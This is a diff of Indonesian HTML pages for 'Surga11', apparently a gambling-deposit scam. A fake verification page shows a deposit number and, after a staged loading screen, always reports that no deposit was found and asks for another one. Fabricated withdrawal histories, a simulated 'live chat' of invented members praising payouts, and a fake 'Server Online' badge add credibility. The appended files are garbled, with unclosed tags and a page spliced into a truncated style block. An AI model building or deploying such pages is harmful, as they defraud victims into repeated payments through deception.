@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Info Akun Player Surga11</title>
+<title>Sistem Verifikasi Surga11</title>
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
 <style>
     * {margin:0; padding:0; box-sizing:border-box;}
@@ -57,6 +57,7 @@
 
     h1 { font-size: 24px; font-weight: 800; color: #ffd700; letter-spacing: 3px; margin-bottom: 5px; }
 
+    /* ANIMASI STATUS TERKUNCI (Blinking Alert) */
     .status-box { 
         font-size: 11px; 
         font-weight: 900; 
@@ -86,20 +87,13 @@
 
     .ssl-secured {
         display: flex; justify-content: center; align-items: center; gap: 8px;
-        font-size: 10px; color: #555; text-transform: uppercase; margin-top: 10px; margin-bottom: 10px;
+        font-size: 10px; color: #555; text-transform: uppercase; margin-top: 10px; margin-bottom: 20px;
     }
     .ssl-secured i { color: #00c853; }
 
-    #realtime-clock {
-        font-size: 11px;
-        color: #ffffff;
-        margin-bottom: 20px;
-        font-weight: 400;
-        opacity: 0.8;
-    }
-
     .pay-icons { display: flex; justify-content: center; gap: 20px; opacity: 0.3; font-size: 20px; }
 
+    /* LOADING OVERLAY */
     #loadingOverlay {
         display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.98); z-index: 2000;
         flex-direction: column; justify-content: center; align-items: center;
@@ -108,6 +102,7 @@
     .radar::after { content: ""; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: conic-gradient(from 0deg, transparent, rgba(255, 215, 0, 0.4)); border-radius: 50%; animation: rot 1s linear infinite; }
     @keyframes rot { to { transform: rotate(360deg); } }
 
+    /* MODAL */
     .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 999; justify-content: center; align-items: center; }
     .modal-box { background: #111; padding: 25px; border-radius: 15px; border: 1px solid #ffd700; text-align: center; width: 85%; max-width: 320px; }
     .btn-ok { background: transparent; color: #007bff; border: none; font-size: 17px; font-weight: bold; float: right; margin-top: 5px; cursor: pointer; }
@@ -146,8 +141,6 @@
         <i class="fas fa-lock"></i> SECURED BY 256-BIT SSL ENCRYPTION
     </div>
 
-    <div id="realtime-clock"></div>
-
     <div class="pay-icons">
         <i class="fa-solid fa-qrcode"></i>
         <i class="fa-solid fa-building-columns"></i>
@@ -161,13 +154,13 @@
         <h2 style="color:#ffd700; font-size:16px; margin-bottom:15px;">METODE VERIFIKASI</h2>
         <div style="background:#ffd700; color:#000; padding:5px; border-radius:5px; font-size:10px; font-weight:900; margin-bottom:10px;">TUJUAN DEPOSIT ANDA</div>
         <div style="background:#222; padding:15px; border-radius:10px; color:#ff3d00; font-weight:bold; font-size:24px; border:1px dashed #ffd700; margin-bottom:20px;">083194887061</div>
-        <button class="btn btn-gold" onclick="processValidation()">SAYA SUDAH DEPOSIT</button>
+        <button class="btn btn-gold" onclick="processValidation()">SAYA SUDAH TRANSFER</button>
     </div>
 </div>
 
 <div class="modal" id="errorModal">
     <div class="modal-box" style="background:#fff; color:#000; text-align:left; border:none;">
-        <h2 style="font-size:18px; border-bottom:1px solid #eee; padding-bottom:10px; margin-bottom:15px;">Info Akun Player Surga11</h2>
+        <h2 style="font-size:18px; border-bottom:1px solid #eee; padding-bottom:10px; margin-bottom:15px;">Info Akun Surga 11</h2>
         <p style="font-size: 14px; color: #333; margin-bottom: 15px;">Mohon maaf, system belum mendeteksi deposit anda. Silahkan deposit kembali.</p>
         <button class="btn-ok" onclick="showModal('errorModal', false)">OKE</button>
         <div style="clear:both;"></div>
@@ -187,29 +180,23 @@
         setTimeout(() => { document.getElementById('loadingOverlay').style.display = 'none'; showModal('errorModal', true); }, 4000);
     }
 
-    function updateClock() {
-        const now = new Date();
-        const options = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit' };
-        document.getElementById('realtime-clock').innerText = now.toLocaleDateString('id-ID', options);
-    }
-    setInterval(updateClock, 1000);
-    updateClock();
-
     function initHistory() {
         const names = ["Eka","Budi","Sari","Agus","Dewi","Rudi","Maya","Dwi","Ayu","Rian","Lina","Yoga","Fajar","Nina","Andi","Santi","Deni","Heri","Rizki","Putra","Bayu","Indah","Putri","Dimas","Wati","Joko","Ani","Bambang","Ratna","Slamet"];
         let savedData = sessionStorage.getItem('historyData');
         
         if (!savedData) {
             let str = "";
+            // Fisher-Yates Shuffle
             for (let i = names.length - 1; i > 0; i--) {
                 const j = Math.floor(Math.random() * (i + 1));
                 [names[i], names[j]] = [names[j], names[i]];
             }
 
-
-names.forEach((name, index) => {
+            names.forEach((name, index) => {
                 let id = Math.floor(Math.random() * 899) + 100;
+                // LOGIKA WD: 3.000.000 sampai 40.000.000 (acak unik)
                 let baseWd = (index * 1200000) + (Math.floor(Math.random() * 800000)) + 3000000;
+                // Pastikan tidak lewat 40jt
                 if(baseWd > 40000000) baseWd = 40000000 - (index * 100000);
                 
                 let val = new Intl.NumberFormat('id-ID').format(baseWd);
@@ -223,5 +210,423 @@ names.forEach((name, index) => {
     }
     initHistory();
 </script>
+</body>
+</html<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Live Chat Realtime</title>
+
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{
+    height:100vh;
+    background:#0b141a;
+    font-family:Arial,Helvetica,sans-serif;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+}
+
+/* CHAT CONTAINER */
+.chat-wrapper{
+    width:100%;
+    max-width:420px;
+    height:90vh;
+    background:#111b21;
+    border-radius:18px;
+    display:flex;
+    flex-direction:column;
+    overflow:hidden;
+    box-shadow:0 10px 30px rgba(0,0,0,.6);
+}
+
+/* HEADER */
+.chat-header{
+    background:#202c33;
+    color:#e9edef;
+    padding:14px;
+    font-weight:bold;
+    letter-spacing:1px;
+}
+
+/* CHAT BODY */
+.chat-body{
+    flex:1;
+    padding:12px;
+    overflow-y:auto;
+}
+
+/* BUBBLE */
+.bubble{
+    max-width:85%;
+    padding:8px 12px;
+    margin-bottom:8px;
+    border-radius:10px;
+    font-size:13px;
+    line-height:1.4;
+    animation:fadeIn .25s ease;
+    word-wrap:break-word;
+}
+.user{
+    background:#005c4b;
+    color:#fff;
+    margin-left:auto;
+    border-bottom-right-radius:2px;
+}
+.name{
+    font-size:10px;
+    color:#9bd1c3;
+    margin-bottom:3px;
+}
+
+@keyframes fadeIn{
+    from{opacity:0;transform:translateY(6px)}
+    to{opacity:1;transform:translateY(0)}
+}
+</style>
+</head>
+
+<body>
+
+<div class="chat-wrapper">
+    <div class="chat-header">LIVE CHAT MEMBER</div>
+    <div class="chat-body" id="chat"></div>
+</div>
+
+<script>
+/* =========================================
+   PROFESSIONAL HUMAN CHAT ENGINE
+========================================= */
+
+const chatBox = document.getElementById("chat");
+
+// DATA
+const nama = [
+"Andi","Budi","Rian","Agus","Doni","Yoga","Rizki","Bayu","Fajar","Putra",
+"Raka","Dimas","Bagas","Ilham","Reza","Daffa","Iqbal","Hendra","Wahyu","Adit",
+"Gilang","Arya","Rafi","Zidan","Akbar","Kevin","Rendy","Tama","Robby","Yusuf"
+];
+
+const makian = [
+"anj*ng","bangs*t","kontol","asu","gila","edan","buset","parah",
+"ngaco","liar","kebangetan","rusuh"
+];
+
+const bonus = [
+"bonus my hero berapa sih",
+"alah bonus ku cuma 2 just",
+"bonus kecil amat",
+"bonus gede tiba tiba",
+"claim bonus masuk juga",
+"bonus cair anjir"
+];
+
+const wd = [
+"wd masuk",
+"wd aman sampe rekening",
+"wd cepet banget",
+"wd gede juga",
+"wd beres tanpa drama"
+];
+
+const sedih = [
+"rungkat parah",
+"kecewa banget",
+"cape mental",
+"zonk terus",
+"kok gini sih"
+];
+
+const bahagia = [
+"hahahaha keren",
+"asli seneng",
+"lega parah",
+"mantap jiwa",
+"ga nyangka dapet"
+];
+
+const panik = [
+"anjir panik",
+"deg degan",
+"takut kepencet",
+"kok loading lama",
+"error kah ini"
+];
+
+const makan = [
+"lagi makan mie",
+"ayam geprek dulu",
+"kopi dulu bentar",
+"lapar jir",
+"nasi padang dulu"
+];
+
+const banjir = [
+"daerah gw banjir",
+"hujan deres banget",
+"air naik lagi",
+"jalanan banjir parah",
+"rumah hampir kemasukan air"
+];
+
+function pick(arr){
+    return arr[Math.floor(Math.random()*arr.length)];
+}
+
+function typo(txt){
+    if(Math.random()<0.3){
+        return txt.replace(/[aeiou]/, v=>v+v);
+    }
+    return txt;
+}
+
+function randomMessage(){
+    const mode = Math.floor(Math.random()*7);
+    if(mode===0) return `${pick(bonus)}, ${pick(makian)}`;
+    if(mode===1) return `${pick(wd)}, ${pick(bahagia)}`;
+    if(mode===2) return `${pick(sedih)}, ${pick(makian)}`;
+    if(mode===3) return `${pick(panik)} ${pick(bonus)}`;
+    if(mode===4) return `${pick(makan)} sambil pantau`;
+    if(mode===5) return `${pick(banjir)} tapi masih buka hp`;
+    return `${pick(makian)} ${pick(bahagia)}`;
+}
+
+// ADD CHAT
+function addChat(){
+    const bubble = document.createElement("div");
+    bubble.className = "bubble user";
+
+    const nm = pick(nama) + Math.floor(Math.random()*900+100);
+    const name = document.createElement("div");
+    name.className = "name";
+    name.innerText = nm;
+
+    const text = document.createElement("div");
+    text.innerText = typo(randomMessage());
+
+    bubble.appendChild(name);
+    bubble.appendChild(text);
+    chatBox.appendChild(bubble);
+
+    chatBox.scrollTop = chatBox.scrollHeight;
+
+    // limit biar ringan
+    if(chatBox.children.length > 80){
+        chatBox.removeChild(chatBox.children[0]);
+    }
+}
+
+// LOOP HUMAN DELAY
+function loop(){
+    addChat();
+    const delay = Math.random()*1500 + 700; // 0.7s – 2.2s
+    setTimeout(loop, delay);
+}
+
+// START
+setTimeout(loop, 1200);
+</script>
+
+</body>
+</html<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Jam Realtime</title>
+<style>
+body{
+    margin:0;
+    height:100vh;
+    background:#000;
+    font-family:Arial, sans-serif;
+}
+#jam{
+    position:fixed;
+    top:8px;
+    right:10px;
+    font-size:11px;
+    color:#00ffcc;
+    background:rgba(0,0,0,0.6);
+    padding:4px 8px;
+    border-radius:6px;
+    text-align:right;
+}
+</style>
+</head>
+<body>
+
+<div id="jam"></div>
+
+<script>
+function updateJam(){
+    const now = new Date();
+    const hari = ["Minggu","Senin","Selasa","Rabu","Kamis","Jumat","Sabtu"];
+    const bulan = ["Januari","Februari","Maret","April","Mei","Juni","Juli","Agustus","September","Oktober","November","Desember"];
+
+    const h = hari[now.getDay()];
+    const tgl = now.getDate();
+    const bln = bulan[now.getMonth()];
+    const thn = now.getFullYear();
+
+    const jam = String(now.getHours()).padStart(2,'0');
+    const menit = String(now.getMinutes()).padStart(2,'0');
+    const detik = String(now.getSeconds()).padStart(2,'0');
+
+    document.getElementById("jam").innerHTML =
+        h + ", " + tgl + " " + bln + " " + thn + "<br>" +
+        jam + ":" + menit + ":" + detik;
+}
+setInterval(updateJam,1000);
+updateJam();
+</script>
+
+</body>
+</html<!
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Surga11 Server</title>
+<style>
+body{
+    margin:0;
+    height:100vh;
+    background:#0b0f14;
+    font-family: "Segoe UI", Arial, sans-serif;
+}
+
+/* Container */
+#server-box{
+    position:fixed;
+    top:10px;
+    left:10px;
+    background:linear-gradient(145deg,#121923,#0b0f14);
+    border:1px solid rgba(255,255,255,0.05);
+    padding:8px 12px;
+    border-radius:10px;
+    box-shadow:0 4px 15px rgba(0,0,0,0.6);
+    font-size:11px;
+    color:#e6e6e6;
+}
+
+/* Title */
+#server-box .title{
+    font-weight:600;
+    letter-spacing:0.3px;
+    margin-bottom:4px;
+}
+
+/* Status row */
+.status{
+    display:flex;
+    align-items:center;
+    gap:6px;
+    color:#3cff9a;
+}
+
+/* Realistic heartbeat */
+.indicator{
+    width:8px;
+    height:8px;
+    border-radius:50%;
+    background:#3cff9a;
+    box-shadow:0 0 6px rgba(60,255,154,0.8);
+    animation:heartbeat 2s ease-in-out infinite;
+}
+
+@keyframes heartbeat{
+    0%{transform:scale(1);opacity:.7}
+    25%{transform:scale(1.3);opacity:1}
+    40%{transform:scale(1);opacity:.9}
+    100%{transform:<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Surga11 Server</title>
+<style>
+body{
+    margin:0;
+    height:100vh;
+    background:#0b0f14;
+    font-family: "Segoe UI", Arial, sans-serif;
+}
+
+/* Container */
+#server-box{
+    position:fixed;
+    top:10px;
+    left:10px;
+    background:linear-gradient(145deg,#121923,#0b0f14);
+    border:1px solid rgba(255,255,255,0.05);
+    padding:8px 12px;
+    border-radius:10px;
+    box-shadow:0 4px 15px rgba(0,0,0,0.6);
+    font-size:11px;
+    color:#e6e6e6;
+}
+
+/* Title */
+#server-box .title{
+    font-weight:600;
+    letter-spacing:0.3px;
+    margin-bottom:4px;
+}
+
+/* Status row */
+.status{
+    display:flex;
+    align-items:center;
+    gap:6px;
+    color:#3cff9a;
+}
+
+/* Realistic heartbeat */
+.indicator{
+    width:8px;
+    height:8px;
+    border-radius:50%;
+    background:#3cff9a;
+    box-shadow:0 0 6px rgba(60,255,154,0.8);
+    animation:heartbeat 2s ease-in-out infinite;
+}
+
+@keyframes heartbeat{
+    0%{transform:scale(1);opacity:.7}
+    25%{transform:scale(1.3);opacity:1}
+    40%{transform:scale(1);opacity:.9}
+    100%{transform:scale(1);opacity:.7}
+}
+</style>
+</head>
+<body>
+
+<div id="server-box">
+    <div class="title">Database Surga11</div>
+    <div class="status">
+        <span class="indicator"></span>
+        Server Online
+    </div>
+</div>
+
+</body>
+</html>
+}
+</style>
+</head>
+<body>
+
+<div id="server-box">
+    <div class="title">Database Surga11</div>
+    <div class="status">
+        <span class="indicator"></span>
+        Server Online
+    </div>
+</div>
+
 </body>
 </html>
